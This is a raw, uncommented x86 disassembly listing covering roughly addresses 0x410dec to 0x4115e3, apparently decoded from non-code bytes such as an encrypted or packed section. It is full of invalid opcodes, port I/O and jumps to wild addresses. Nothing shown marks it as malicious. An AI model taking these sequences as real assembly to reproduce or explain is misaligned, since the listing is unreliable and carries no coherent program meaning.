  410dec:	push   ebx
  410ded:	imul   ebp,esp,0xfffffffb
  410df0:	inc    BYTE PTR [esi]
  410df2:	mov    bl,0xcc
  410df4:	popf   
  410df5:	stc    
  410df6:	lahf   
  410df7:	or     BYTE PTR [edi+0x38],ah
  410dfa:	mov    bl,0x23
  410dfc:	mov    eax,0x487a9214
  410e01:	add    ah,ch
  410e03:	mov    ?,eax
  410e05:	xor    dl,BYTE PTR [esi]
  410e07:	sbb    al,bh
  410e09:	and    DWORD PTR [edx-0x3a],eax
  410e0c:	add    ebp,esi
  410e0e:	sar    BYTE PTR [eax-0x6c],1
  410e11:	ja     0x410e37
  410e13:	pop    ebp
  410e14:	pop    ebp
  410e15:	es push eax
  410e17:	sbb    ebx,DWORD PTR [esi-0x628f589]
  410e1d:	jns    0x410e7f
  410e1f:	pop    ds
  410e20:	dec    ecx
  410e21:	gs leave 
  410e23:	sahf   
  410e24:	int3   
  410e25:	dec    esp
  410e26:	jne    0x410e9b
  410e28:	les    ebp,FWORD PTR [esi]
  410e2a:	ja     0x410e73
  410e2c:	adc    ebx,edi
  410e2e:	stos   DWORD PTR es:[edi],eax
  410e2f:	lea    ebx,[ecx-0x4adb27f]
  410e35:	inc    ebp
  410e36:	pop    esp
  410e37:	pop    esi
  410e38:	mov    esp,0x4de7daa0
  410e3d:	fwait
  410e3e:	add    dh,BYTE PTR [esi+0x32]
  410e41:	cmp    DWORD PTR [ecx],edx
  410e43:	repnz or ebp,DWORD PTR [eax-0x2]
  410e47:	ins    BYTE PTR es:[edi],dx
  410e48:	jmp    0x702aef0
  410e4d:	sub    ecx,eax
  410e4f:	rep stos BYTE PTR es:[edi],al
  410e51:	lds    esi,FWORD PTR [eiz*4-0x6c2aae48]
  410e58:	cli    
  410e59:	inc    ecx
  410e5a:	inc    eax
  410e5b:	or     ecx,edi
  410e5d:	mov    ah,0x30
  410e5f:	jne    0x410de8
  410e61:	out    dx,al
  410e62:	ss lahf 
  410e64:	sar    DWORD PTR [ecx+0x67566563],0xda
  410e6b:	enter  0xa702,0x79
  410e6f:	imul   BYTE PTR [esi+edi*2+0x4d]
  410e73:	(bad)  
  410e74:	lahf   
  410e75:	mov    bh,BYTE PTR [esi]
  410e77:	mov    edi,0xc5225ec8
  410e7c:	aam    0xca
  410e7e:	mov    gs,WORD PTR [ebx+0x12]
  410e81:	jg     0x410e4e
  410e83:	and    BYTE PTR [eax-0x3f5baa04],ch
  410e89:	xlat   BYTE PTR ds:[ebx]
  410e8a:	std    
  410e8b:	dec    esp
  410e8c:	in     al,0xe0
  410e8e:	xchg   esp,eax
  410e8f:	jbe    0x410e26
  410e91:	shl    esp,cl
  410e93:	mov    bl,0x3e
  410e95:	in     al,0xa2
  410e97:	pop    ebp
  410e98:	pop    ecx
  410e99:	ds mov esp,0x95116db
  410e9f:	adc    eax,0x8ecefc2f
  410ea4:	and    eax,0xcf38187d
  410ea9:	ins    BYTE PTR es:[edi],dx
  410eaa:	shr    DWORD PTR [ecx],0xe7
  410ead:	or     BYTE PTR [esi],0x20
  410eb0:	(bad)  
  410eb1:	or     eax,0x414389cb
  410eb6:	adc    al,0x20
  410eb8:	or     ebx,DWORD PTR [edi-0x5b]
  410ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ebc:	xor    eax,0xea660677
  410ec1:	dec    ecx
  410ec2:	mov    ah,0x16
  410ec4:	sub    esp,ebx
  410ec6:	fist   WORD PTR [edi-0xb]
  410ec9:	retf   0x1e
  410ecc:	aaa    
  410ecd:	dec    ebx
  410ece:	sbb    dh,dh
  410ed0:	loopne 0x410e7e
  410ed2:	fisub  DWORD PTR [eax+0x74247103]
  410ed8:	adc    BYTE PTR [edx-0x687d2778],ah
  410ede:	ret    
  410edf:	idiv   esi
  410ee1:	mov    ebx,0xb418c90
  410ee6:	rcl    BYTE PTR [ecx-0x711806e3],cl
  410eec:	frstor [eax+ebx*8-0x1]
  410ef0:	and    ah,BYTE PTR [eax+edx*8+0xf]
  410ef4:	retf   
  410ef5:	mov    ?,WORD PTR [ebx]
  410ef7:	frstor [eax+0x58f0fcaa]
  410efd:	add    BYTE PTR [esi],bl
  410eff:	inc    esi
  410f00:	dec    edi
  410f01:	mov    eax,0x35a19dc9
  410f06:	cld    
  410f07:	cmp    ebp,ebx
  410f09:	sahf   
  410f0a:	mov    bh,0xb1
  410f0c:	sbb    edx,DWORD PTR [edi+0x71194a4b]
  410f12:	inc    ecx
  410f13:	repnz inc edx
  410f15:	sub    DWORD PTR [edx],0xfffffff7
  410f18:	xchg   esp,eax
  410f19:	stos   DWORD PTR es:[edi],eax
  410f1a:	jecxz  0x410ef2
  410f1c:	sti    
  410f1d:	pop    ecx
  410f1e:	cmp    eax,0x8ce9d52
  410f23:	popf   
  410f24:	ret    0x8ae5
  410f27:	in     eax,0xf5
  410f29:	mov    DWORD PTR [edx],edi
  410f2b:	pop    es
  410f2c:	mul    BYTE PTR [ecx+ebx*1-0x692c665e]
  410f33:	mov    edi,DWORD PTR [ebp+0x2e]
  410f36:	or     esp,DWORD PTR [ebx-0x6f]
  410f39:	(bad)  
  410f3b:	pop    esi
  410f3c:	lods   eax,DWORD PTR ds:[esi]
  410f3d:	xchg   esi,eax
  410f3e:	mov    DWORD PTR [eax+0x32],ebp
  410f41:	sbb    eax,0xd2405135
  410f46:	int    0xd
  410f48:	mov    ch,0x8d
  410f4a:	sub    eax,DWORD PTR [ebp+0x172e946]
  410f50:	add    ecx,DWORD PTR [ecx+0x428fa8bf]
  410f56:	xor    al,0xa7
  410f58:	pop    edi
  410f59:	sbb    DWORD PTR [ebx+0x53e00e74],esp
  410f5f:	and    BYTE PTR [ebp+0x46],0xbb
  410f63:	pusha  
  410f64:	or     eax,DWORD PTR [ecx-0x9]
  410f67:	sub    cl,bl
  410f69:	mov    eax,ds:0xfbeecc24
  410f6e:	xor    DWORD PTR [edi-0x8b3deb2],ebx
  410f74:	cwde   
  410f75:	in     al,0x70
  410f77:	fmul   QWORD PTR [ecx-0x54]
  410f7a:	gs push edx
  410f7c:	or     edx,DWORD PTR ds:0x28b2cc7
  410f82:	xchg   BYTE PTR [ebp-0x5a3dd8eb],dh
  410f88:	in     al,dx
  410f89:	fdiv   QWORD PTR [ecx]
  410f8b:	ror    ah,1
  410f8d:	mov    ebx,0x9822fc9a
  410f92:	dec    esp
  410f93:	mov    eax,0x9de89214
  410f98:	sub    eax,0x107aa06
  410f9d:	out    0x35,al
  410f9f:	(bad)  
  410fa0:	mov    dl,BYTE PTR [eax-0x245aa16a]
  410fa6:	pop    ebx
  410fa7:	lahf   
  410fa8:	fs sub ebx,ebp
  410fab:	jg     0x410ff1
  410fad:	mov    eax,0xefc8c3fd
  410fb2:	push   ds
  410fb3:	scas   eax,DWORD PTR es:[edi]
  410fb4:	stos   DWORD PTR es:[edi],eax
  410fb5:	aam    0xb8
  410fb7:	mov    esi,0xb7f61ac2
  410fbc:	stos   DWORD PTR es:[edi],eax
  410fbd:	jmp    0x410ffc
  410fbf:	mov    al,ds:0xc3e69cce
  410fc4:	adc    bl,BYTE PTR ds:0xdb8b0831
  410fca:	push   0xeced5451
  410fcf:	ins    DWORD PTR es:[edi],dx
  410fd0:	pop    ss
  410fd1:	(bad)  
  410fd2:	sub    al,0x9d
  410fd4:	and    al,0x46
  410fd6:	nop
  410fd7:	xchg   esp,eax
  410fd8:	xor    BYTE PTR ds:0x86b7f5c1,cl
  410fde:	mov    ss,WORD PTR [eax+0x76]
  410fe1:	adc    DWORD PTR [esi],edx
  410fe3:	ds stos DWORD PTR es:[edi],eax
  410fe5:	push   edx
  410fe6:	cmc    
  410fe7:	pop    ebx
  410fe8:	mov    gs,WORD PTR [eax-0x64]
  410feb:	mov    bl,BYTE PTR [edx]
  410fed:	lock shl DWORD PTR [ebp-0x43],cl
  410ff1:	jl     0x411009
  410ff3:	and    BYTE PTR es:[ebx-0x45c94db1],ah
  410ffa:	fmul   DWORD PTR [ebx+0x79]
  410ffd:	mov    ebp,0xe2024b95
  411002:	lds    edi,FWORD PTR [esi+0x191ad592]
  411008:	popa   
  411009:	ss test eax,0x1f8563e2
  41100f:	lods   al,BYTE PTR ds:[esi]
  411010:	shr    BYTE PTR [ecx-0x6f],1
  411013:	push   0x5d
  411015:	ja     0x411039
  411017:	mov    ds:0xfd4abfa,al
  41101c:	mov    dl,0x9e
  41101e:	xchg   esp,eax
  41101f:	ficom  WORD PTR [edi-0x205c091c]
  411025:	push   es
  411026:	sub    DWORD PTR [edx+0x54],ecx
  411029:	sub    DWORD PTR [eax+0x49],0xfd551c0a
  411030:	ret    
  411031:	jge    0x411081
  411033:	aad    0xa1
  411035:	xor    esp,DWORD PTR [edi+0x8]
  411038:	fisttp WORD PTR [ebx+0x4a]
  41103b:	gs add ecx,ebp
  41103e:	dec    ecx
  41103f:	je     0x411058
  411041:	imul   ebp,DWORD PTR [ebx+0x4f],0xc8e32bf
  411048:	js     0x411041
  41104a:	jno    0x411014
  41104c:	scas   eax,DWORD PTR es:[edi]
  41104d:	xchg   esp,eax
  41104e:	mov    bh,BYTE PTR [eax]
  411050:	(bad)  
  411051:	aam    0x4e
  411053:	sub    DWORD PTR [eax+0x7f943470],esp
  411059:	pop    esp
  41105a:	int    0xf8
  41105c:	cmp    ebx,DWORD PTR [edi-0x1d]
  41105f:	int3   
  411060:	dec    esi
  411061:	jae    0x4110bd
  411063:	cwde   
  411064:	cwde   
  411065:	retf   0x188f
  411068:	repz push 0xffffffd3
  41106b:	lds    esi,FWORD PTR [edx+edx*4+0x2]
  41106f:	je     0x41105f
  411071:	loope  0x4110be
  411073:	pop    ds
  411074:	leave  
  411075:	(bad)  
  411076:	cs sahf 
  411078:	fxch   st(3)
  41107a:	nop
  41107b:	rcl    BYTE PTR [ecx-0x5df5548f],1
  411081:	fnsave [edi-0x17]
  411084:	dec    esi
  411085:	shl    DWORD PTR [esi-0x27d6b5c3],0xdd
  41108c:	das    
  41108d:	or     ch,bh
  41108f:	test   al,0xda
  411091:	loop   0x4110e6
  411093:	lahf   
  411094:	cmp    BYTE PTR [ebp+0x3cae33bb],0x42
  41109b:	stos   BYTE PTR es:[edi],al
  41109c:	dec    esi
  41109d:	xchg   ebp,eax
  41109e:	imul   esi,DWORD PTR [edx],0xffffff92
  4110a1:	cdq    
  4110a2:	pop    es
  4110a3:	imul   ebp,esp,0xffffffeb
  4110a6:	(bad)  
  4110a8:	xor    ch,BYTE PTR [ebp+0x5c]
  4110ab:	pop    ss
  4110ac:	sub    ebp,DWORD PTR ds:0xa4d8a810
  4110b2:	jno    0x4110bc
  4110b4:	les    eax,FWORD PTR [ecx]
  4110b6:	mov    ah,0x46
  4110b8:	ret    0x3fed
  4110bb:	pop    ss
  4110bc:	test   eax,0x30d4f71
  4110c1:	cld    
  4110c2:	pop    esi
  4110c3:	out    0x36,al
  4110c5:	dec    edi
  4110c6:	pusha  
  4110c7:	push   ds
  4110c8:	clc    
  4110c9:	ror    BYTE PTR [edx+0x1cc35a85],1
  4110cf:	test   eax,ebx
  4110d1:	addr16 pop ecx
  4110d3:	jae    0x411153
  4110d5:	(bad)  
  4110d6:	das    
  4110d7:	pop    ss
  4110d8:	loop   0x411141
  4110da:	jno    0x411121
  4110dc:	shl    BYTE PTR [ebx+ebp*2-0x42],1
  4110e0:	and    dl,BYTE PTR ds:0xf1754429
  4110e6:	nop
  4110e7:	mov    ebx,0x39e64b5b
  4110ec:	mov    al,ds:0xf7d968b6
  4110f1:	sub    al,dh
  4110f3:	jns    0x41114e
  4110f5:	ja     0x4110f5
  4110f7:	in     al,0xa6
  4110f9:	je     0x41110b
  4110fb:	fs leave 
  4110fd:	xchg   ebx,eax
  4110fe:	mov    ds:0xe5933956,eax
  411103:	hlt    
  411104:	xor    ebx,DWORD PTR [esi-0xe95a431]
  41110a:	sub    DWORD PTR [esp+esi*2-0x23],0x2b
  41110f:	cld    
  411110:	mov    ecx,0xddc9e7fe
  411115:	pop    eax
  411116:	mov    edx,0xe87b6577
  41111b:	xchg   ebp,eax
  41111c:	fdiv   DWORD PTR [eax-0x45]
  41111f:	loop   0x4110ef
  411121:	aas    
  411122:	jbe    0x41116f
  411124:	sbb    eax,0x7a070ee3
  411129:	fstp   QWORD PTR [ebp+edi*4+0x5b1c3a93]
  411130:	jb     0x4110d2
  411132:	pop    ebx
  411133:	and    BYTE PTR [eax+eax*2],0x70
  411137:	add    al,0xed
  411139:	xor    esi,DWORD PTR [eax-0x33]
  41113c:	xor    al,0xe6
  41113e:	mov    ecx,0xcc2a5da2
  411143:	fsubp  st(3),st
  411145:	and    al,0xd6
  411147:	jmp    0x41117e
  411149:	fs add al,0x80
  41114c:	jmp    0x2e98e467
  411151:	addr16 sub esp,edx
  411154:	in     eax,dx
  411155:	out    dx,al
  411156:	clc    
  411157:	jecxz  0x41117f
  411159:	mov    edx,0xce68ddf6
  41115e:	and    DWORD PTR [ecx],esp
  411160:	sbb    eax,0x976aead4
  411165:	(bad)  {k1}{z}
  41116a:	jmp    0x4111ba
  41116c:	jge    0x411129
  41116e:	test   eax,0xc4a1c2e5
  411173:	push   ebx
  411174:	es pop ebp
  411176:	repz jge 0x4111f2
  411179:	retf   0x35a2
  41117c:	lods   al,BYTE PTR ds:[esi]
  41117d:	test   DWORD PTR fs:[ebx],0x9fa2070d
  411184:	outs   dx,DWORD PTR ds:[esi]
  411185:	ja     0x41117a
  411187:	dec    esp
  411188:	popf   
  411189:	mov    edx,0xaf1ebe4e
  41118e:	(bad)  
  411190:	jp     0x411130
  411192:	xor    DWORD PTR [edi-0x22],ebx
  411195:	pop    ss
  411196:	and    BYTE PTR [edi],0x4c
  411199:	rcl    DWORD PTR [edi+0xb],0xe0
  41119d:	add    bh,BYTE PTR [edi-0x3dbb3be9]
  4111a3:	add    cl,0xd
  4111a6:	cs cmc 
  4111a8:	icebp  
  4111a9:	sbb    DWORD PTR [ecx-0x3466dd4c],edx
  4111af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111b0:	fwait
  4111b1:	mov    ecx,0xc7411013
  4111b6:	xchg   BYTE PTR [ecx+0x3c65fc21],bl
  4111bc:	pop    ss
  4111bd:	lds    eax,FWORD PTR [ecx-0x4640f569]
  4111c3:	adc    al,0x21
  4111c5:	xor    bl,al
  4111c7:	xor    ebp,esp
  4111c9:	mov    ebp,0x455cf2c3
  4111ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111cf:	hlt    
  4111d0:	xchg   esp,eax
  4111d1:	pop    ecx
  4111d2:	test   BYTE PTR [edi+0x1ac01f45],ch
  4111d8:	or     ch,BYTE PTR [edx]
  4111da:	rol    BYTE PTR [ecx-0x4b9ee5b0],0x41
  4111e1:	jns    0x411169
  4111e3:	sbb    esi,ebp
  4111e5:	adc    esp,esi
  4111e7:	inc    ecx
  4111e8:	sub    edi,DWORD PTR ds:0xe3a181cc
  4111ee:	fs cmp al,0x0
  4111f1:	push   edi
  4111f2:	cmp    ecx,DWORD PTR [edx-0x11]
  4111f5:	xor    DWORD PTR [ebx-0x59],ecx
  4111f8:	xchg   DWORD PTR [esi+0x5a],esi
  4111fb:	push   ds
  4111fc:	lea    ecx,[ebx]
  4111fe:	cmp    BYTE PTR [eax-0x2592108f],dh
  411204:	push   ebp
  411205:	stos   DWORD PTR es:[edi],eax
  411206:	jns    0x411217
  411208:	mov    dh,0x2b
  41120a:	add    BYTE PTR [ebp+0x2e],dh
  41120d:	ss push edi
  41120f:	xchg   esi,eax
  411210:	popa   
  411211:	xchg   dh,dh
  411213:	mov    ds:0xe350e208,al
  411218:	jp     0x41121b
  41121a:	dec    esi
  41121b:	and    esp,DWORD PTR ds:0xb9182ac8
  411221:	ret    
  411222:	jb     0x411232
  411224:	mov    eax,ds:0x8f84d819
  411229:	seta   BYTE PTR [esi+eiz*8-0x23]
  41122e:	pop    ebx
  41122f:	pop    edi
  411230:	in     al,0x35
  411232:	cmp    dh,BYTE PTR ds:0x6fbb5a53
  411238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411239:	shl    DWORD PTR [ebp+0xe0d5df4],0xeb
  411240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411241:	push   eax
  411242:	imul   esi,esp,0xffffff8e
  411245:	sbb    al,0xbe
  411247:	mov    ebx,0xbc8b1a2f
  41124c:	jae    0x411260
  41124e:	push   0xffffff87
  411250:	fld    QWORD PTR [eax]
  411252:	inc    ebp
  411253:	(bad)  
  411254:	push   ds
  411255:	es push edi
  411257:	daa    
  411258:	clc    
  411259:	in     eax,0x2c
  41125b:	mov    dl,0x8e
  41125d:	jmp    0x98878785
  411262:	pswapd mm6,QWORD PTR [esi]
  411266:	les    ecx,FWORD PTR [esi+0x61]
  411269:	(bad)  
  41126b:	sbb    al,0x22
  41126d:	sub    BYTE PTR [ebx+0x3f],bl
  411270:	mov    al,ds:0xed5b626d
  411275:	js     0x4112e9
  411277:	lds    ebx,FWORD PTR [eax-0x5ba8da55]
  41127d:	xchg   edi,eax
  41127e:	xchg   ecx,eax
  41127f:	cli    
  411280:	and    DWORD PTR [ecx+0x47df748a],0x6f
  411287:	mov    al,ds:0x880798f3
  41128c:	or     DWORD PTR [ecx-0x68],edx
  41128f:	lahf   
  411290:	lds    ecx,FWORD PTR [ebx-0x34]
  411293:	and    DWORD PTR [ecx-0x6a3a8c3b],edx
  411299:	inc    edi
  41129a:	lea    eax,[eax-0x60]
  41129d:	jnp    0x4112ec
  41129f:	mov    bl,0xf3
  4112a1:	sub    al,0x91
  4112a3:	nop
  4112a4:	and    BYTE PTR [ebx],dh
  4112a6:	cmp    ah,dh
  4112a8:	outs   dx,DWORD PTR ds:[esi]
  4112a9:	xor    dh,BYTE PTR [ebx+edx*1]
  4112ac:	test   eax,0xf8c5eedf
  4112b1:	in     eax,dx
  4112b2:	out    dx,eax
  4112b3:	mov    edx,0x53ab778
  4112b8:	jge    0x41123a
  4112ba:	test   eax,0x81107d14
  4112bf:	iret   
  4112c0:	pop    ecx
  4112c1:	jge    0x411253
  4112c3:	dec    esi
  4112c4:	(bad)  
  4112c5:	mov    edx,0x3331a680
  4112ca:	test   BYTE PTR [ebp-0x6a3ae59a],al
  4112d0:	jae    0x4112c5
  4112d2:	adc    cl,ah
  4112d4:	adc    al,BYTE PTR ds:0xdc3252df
  4112da:	(bad)  
  4112db:	in     al,0xcb
  4112dd:	out    dx,al
  4112de:	mov    bh,BYTE PTR [ebp+eax*8+0x11]
  4112e2:	mov    dl,0x3
  4112e4:	lahf   
  4112e5:	dec    edi
  4112e6:	xchg   ecx,eax
  4112e7:	push   ebx
  4112e8:	xchg   edx,eax
  4112e9:	inc    eax
  4112ea:	mov    BYTE PTR [ecx],bh
  4112ec:	(bad)  
  4112ed:	ja     0x4112d0
  4112ef:	adc    al,BYTE PTR [ebp-0x74034bd3]
  4112f5:	sbb    al,0xc7
  4112f7:	retf   0x52a0
  4112fa:	mov    BYTE PTR [edi+0x3a35d01d],0x47
  411301:	ret    0x9a56
  411304:	les    edi,FWORD PTR [edx]
  411306:	mov    cl,0x14
  411308:	gs jmp 0x219ba68f
  41130e:	mov    ds:0xf692610a,al
  411313:	ds je  0x41137e
  411316:	mov    dh,0x14
  411318:	jmp    DWORD PTR [edi+esi*4-0x6c]
  41131c:	shl    BYTE PTR [ebx+0x49037f14],0x37
  411323:	sbb    BYTE PTR [esi-0x60],bl
  411326:	inc    eax
  411327:	sub    eax,0x8909cebe
  41132c:	mov    al,ds:0x2413d4c2
  411331:	outs   dx,BYTE PTR ds:[esi]
  411332:	loopne 0x411318
  411334:	fs out 0xaf,al
  411337:	adc    al,0x11
  411339:	iret   
  41133a:	test   DWORD PTR [edx],esi
  41133c:	mov    WORD PTR [edx+0x69],es
  41133f:	ds test eax,0xbc00d204
  411345:	imul   ecx,DWORD PTR [edi-0xa],0x27
  411349:	retf   
  41134a:	cwde   
  41134b:	outs   dx,BYTE PTR ds:[esi]
  41134c:	pop    esp
  41134d:	(bad)  
  41134e:	sub    cl,bh
  411350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411351:	les    ebp,FWORD PTR [ebx+0x102c1df7]
  411357:	std    
  411358:	adc    ch,BYTE PTR [esi-0x52]
  41135b:	xor    edi,ecx
  41135d:	or     BYTE PTR [edx-0x7959de5f],al
  411363:	lea    ebp,[ebx+0x63]
  411366:	daa    
  411367:	xchg   edi,eax
  411368:	retf   0x9441
  41136b:	loop   0x4113e5
  41136d:	inc    ebp
  41136e:	inc    esp
  41136f:	(bad)  
  411370:	jl     0x4113cd
  411372:	push   0x25
  411374:	sbb    al,0xf5
  411376:	ja     0x4113cb
  411378:	mov    dl,0x94
  41137a:	inc    esi
  41137b:	sahf   
  41137c:	cmp    cl,BYTE PTR [ecx-0x93226ad]
  411382:	repnz loope 0x41136d
  411385:	call   0x94ab9760
  41138a:	clc    
  41138b:	(bad)  
  41138c:	cmp    DWORD PTR [ebp-0x375f3f39],eax
  411392:	inc    edi
  411393:	inc    ebx
  411394:	adc    DWORD PTR [edx],eax
  411396:	cmp    eax,0xbd9dca1d
  41139b:	mov    ah,0xec
  41139d:	fs jbe 0x411329
  4113a0:	xor    ebx,DWORD PTR [edi-0x663870f]
  4113a6:	data16 test BYTE PTR fs:[edi],al
  4113aa:	or     DWORD PTR [ebx],eax
  4113ac:	mov    ecx,0x278837d8
  4113b1:	jle    0x4113ad
  4113b3:	cli    
  4113b4:	fstp   TBYTE PTR [eax]
  4113b6:	pop    ebx
  4113b7:	or     eax,0xac7a6d5e
  4113bc:	stc    
  4113bd:	loopne 0x4113aa
  4113bf:	in     eax,dx
  4113c0:	dec    esi
  4113c1:	mov    WORD PTR [eax+0x2d],ss
  4113c4:	inc    edx
  4113c5:	(bad)  
  4113c6:	dec    ebx
  4113c7:	imul   esi,DWORD PTR [esi+0x77f18d3b],0xffffffd9
  4113ce:	or     DWORD PTR [edx+0x44],eax
  4113d1:	jno    0x411436
  4113d3:	xchg   esi,eax
  4113d4:	and    DWORD PTR [ebp+0x2724629e],esi
  4113da:	sti    
  4113db:	inc    eax
  4113dc:	xchg   ebx,edx
  4113de:	daa    
  4113df:	dec    ebx
  4113e0:	retf   
  4113e1:	fstp   DWORD PTR [eax+0xe]
  4113e4:	push   eax
  4113e5:	mov    eax,ss:0x9f978984
  4113eb:	mov    ecx,0x58048fa8
  4113f0:	push   0xffffffb1
  4113f2:	sti    
  4113f3:	ret    0xdfa7
  4113f6:	aad    0x90
  4113f8:	inc    edx
  4113f9:	inc    edi
  4113fa:	stos   BYTE PTR es:[edi],al
  4113fb:	aaa    
  4113fc:	lahf   
  4113fd:	mov    al,ds:0x70c2de3e
  411402:	imul   esp,DWORD PTR [ebp+0x53],0x6af0c58f
  411409:	sbb    DWORD PTR [ebx-0x22490b78],ebx
  41140f:	call   0xa7e4ed9a
  411414:	xor    al,0xc8
  411416:	mov    dl,0xb9
  411418:	repz popa 
  41141a:	push   ds
  41141b:	shl    eax,1
  41141d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41141e:	or     DWORD PTR [edx],ebp
  411420:	mov    ebp,ss
  411422:	pop    DWORD PTR [edi+0x70]
  411425:	mov    ch,0xda
  411427:	add    al,0xf1
  411429:	adc    cl,BYTE PTR [edx-0x5a]
  41142c:	cwde   
  41142d:	jb     0x41144b
  41142f:	jmp    0xe265:0xeacb45b8
  411436:	jge    0x411474
  411438:	mov    ds:0xb76aa70b,al
  41143d:	in     al,0x2a
  41143f:	es icebp 
  411441:	(bad)  
  411442:	aaa    
  411443:	into   
  411444:	out    0xb0,eax
  411446:	push   ecx
  411447:	cdq    
  411448:	add    ecx,ebp
  41144a:	pusha  
  41144b:	push   es
  41144c:	les    eax,FWORD PTR [esi]
  41144e:	out    dx,eax
  41144f:	xor    DWORD PTR [eax+0x3aaa3d76],esi
  411455:	ss pop esi
  411457:	xchg   ebp,ebp
  411459:	popf   
  41145a:	mov    eax,0xc08c4ec2
  41145f:	push   eax
  411460:	pop    esp
  411461:	ror    BYTE PTR [ecx],0x95
  411464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411465:	mov    al,ds:0xee57c477
  41146a:	out    dx,al
  41146b:	sub    eax,0x15014acc
  411470:	repz push 0x24e891c6
  411476:	sti    
  411477:	sar    BYTE PTR [eax],1
  411479:	lock iret 
  41147b:	shr    BYTE PTR [edx-0x5e],cl
  41147e:	and    al,0x63
  411480:	xchg   esp,edi
  411482:	pop    esp
  411483:	std    
  411484:	add    esp,eax
  411486:	in     eax,dx
  411487:	sbb    ebp,eax
  411489:	jmp    0xfba49634
  41148e:	push   0x9d29d43c
  411493:	sub    eax,0xfd4c685b
  411498:	repz out 0xb9,al
  41149b:	pusha  
  41149c:	leave  
  41149d:	push   0xf5122d5d
  4114a2:	dec    edx
  4114a3:	mov    ah,0xf6
  4114a5:	xor    al,0x9a
  4114a7:	lods   eax,DWORD PTR ds:[esi]
  4114a8:	cmp    BYTE PTR [eax-0x44],0x78
  4114ac:	xchg   ebx,eax
  4114ad:	cmp    al,0xd1
  4114af:	and    eax,eax
  4114b1:	hlt    
  4114b2:	xor    eax,0x312e03ec
  4114b7:	arpl   WORD PTR [esi+0x4c70e79b],bp
  4114bd:	lods   eax,DWORD PTR ds:[esi]
  4114be:	or     al,0xb4
  4114c0:	test   eax,0xe7ed64ca
  4114c6:	lea    dx,[edx+eax*4]
  4114ca:	cmp    al,0xe1
  4114cc:	inc    ebp
  4114cd:	jbe    0x411520
  4114cf:	or     ebx,DWORD PTR [edi+esi*8+0x1060c135]
  4114d6:	jne    0x4114fc
  4114d8:	call   0xba11:0x33a16a36
  4114df:	push   esp
  4114e0:	push   edi
  4114e1:	mov    cl,0x54
  4114e3:	push   esp
  4114e4:	test   al,0x76
  4114e6:	aam    0x5
  4114e8:	imul   ebp,edi,0x3
  4114eb:	mov    ebx,0xf64ae487
  4114f0:	push   esi
  4114f1:	push   ebp
  4114f2:	adc    dl,dl
  4114f4:	(bad)  
  4114f5:	fsubr  st(4),st
  4114f7:	push   edi
  4114f8:	sub    al,0xa7
  4114fa:	repnz mov ch,0x31
  4114fd:	mov    esp,0xf582999d
  411502:	inc    ebp
  411503:	push   0x7f
  411505:	arpl   WORD PTR [ebx+eiz*1+0x68],bp
  411509:	or     BYTE PTR [edx+0x6e],dl
  41150c:	mov    edx,0xf9f21f80
  411511:	or     esi,DWORD PTR [eax+0x3c]
  411514:	push   edi
  411515:	inc    edx
  411516:	inc    eax
  411517:	dec    edi
  411518:	retf   
  411519:	les    ecx,FWORD PTR [edi]
  41151b:	push   es
  41151c:	adc    DWORD PTR [eax+0x40],0xa656b2a8
  411523:	pop    ss
  411524:	mov    bh,0x4a
  411526:	shr    DWORD PTR ds:0x453e968e,cl
  41152c:	fst    st(0)
  41152e:	pushf  
  41152f:	dec    ebx
  411530:	loop   0x4115a5
  411532:	or     esi,ecx
  411534:	dec    ecx
  411535:	add    DWORD PTR gs:[ecx-0x5c64cf4a],ebp
  41153c:	fbstp  TBYTE PTR [ecx-0x69]
  41153f:	jbe    0x41154c
  411541:	or     ah,ah
  411543:	dec    ebp
  411544:	cwde   
  411545:	sbb    esi,DWORD PTR [edi]
  411547:	clc    
  411548:	ss loopne 0x4114fd
  41154b:	aam    0x7
  41154d:	outs   dx,DWORD PTR ds:[esi]
  41154e:	xor    esp,DWORD PTR [edi-0x2c7b62d6]
  411554:	ins    DWORD PTR es:[edi],dx
  411555:	mov    dh,0x4a
  411557:	or     al,0x5f
  411559:	or     DWORD PTR [esi],eax
  41155b:	xor    bl,bl
  41155d:	jb     0x411533
  41155f:	mov    cl,0xc0
  411561:	mov    BYTE PTR [ecx+0x62],dl
  411564:	dec    esi
  411565:	sub    esi,DWORD PTR [esi-0xce63990]
  41156b:	adc    al,0x28
  41156d:	scas   eax,DWORD PTR es:[edi]
  41156e:	fidiv  DWORD PTR fs:[esi]
  411571:	and    al,0xd7
  411573:	mov    BYTE PTR [eax-0x7a9db112],al
  411579:	out    dx,eax
  41157a:	add    DWORD PTR [edi],esp
  41157c:	les    edx,FWORD PTR [ecx]
  41157e:	push   cs
  41157f:	aaa    
  411580:	jecxz  0x4115e3
  411582:	call   0x11fc:0xf4347df8
  411589:	fidivr DWORD PTR [ecx]
  41158b:	add    al,0xee
  41158d:	int    0x87
  41158f:	inc    ebp
  411590:	ficomp WORD PTR [eax-0x5edf9b75]
  411596:	lock imul edx,esi,0xe1044da3
  41159d:	iret   
  41159e:	lds    ecx,FWORD PTR [eax-0x6f9ebf26]
  4115a4:	xor    BYTE PTR [ecx+0x1f],ah
  4115a7:	mov    ecx,gs
  4115a9:	lahf   
  4115aa:	inc    esi
  4115ab:	retf   
  4115ac:	pop    ebx
  4115ad:	sbb    cl,BYTE PTR [eax]
  4115af:	jl     0x41162e
  4115b1:	or     al,0x6d
  4115b3:	lahf   
  4115b4:	dec    esi
  4115b5:	mov    bl,0x18
  4115b7:	pop    ds
  4115b8:	mov    bh,0xed
  4115ba:	repz in eax,0xfd
  4115bd:	cdq    
  4115be:	push   ss
  4115bf:	setp   ch
  4115c2:	mov    al,ds:0x2342b216
  4115c7:	adc    DWORD PTR [edi],edi
  4115c9:	jge    0x4115f9
  4115cb:	je     0x41157f
  4115cd:	dec    edx
  4115ce:	mov    edx,0x1072cc3
  4115d3:	push   ebx
  4115d4:	or     BYTE PTR [edx],bl
  4115d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115d7:	test   eax,0x7ce35ec5
  4115dc:	or     BYTE PTR [ebp+0x74bc2b4a],0x92
  4115e3:	and    eax,0x8bb385ae
